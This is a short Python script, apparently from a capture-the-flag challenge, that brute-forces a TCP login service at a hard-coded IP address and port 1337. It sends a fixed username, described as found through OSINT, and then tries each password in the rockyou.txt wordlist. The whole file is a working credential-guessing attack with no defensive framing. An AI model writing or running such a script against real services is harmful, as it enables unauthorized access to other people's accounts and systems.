import socket
import time

host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    file = open(wordlist,"r");
    for line in file:
        # starting port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))
        
        # setting username and password
        username = "v0idcache\n"   # found using OSINT
        password = line; # current password
        
        # sending and receiving username
        s.send(username);
        data = s.recv(2048);
        print(data + " " + username);
        
        # sending and receiving password
        s.send(password);
        data = s.recv(2048);
        print(data + " " + password);
        
        # pausing executing to allow confirmation
        time.sleep(.1)
        
        # getting the result (basically trying to clear pipe)
        data = s.recv(2048);
        print(data + "\n");
        
        # closing port
        s.close();


if __name__ == '__main__':
    brute_force()
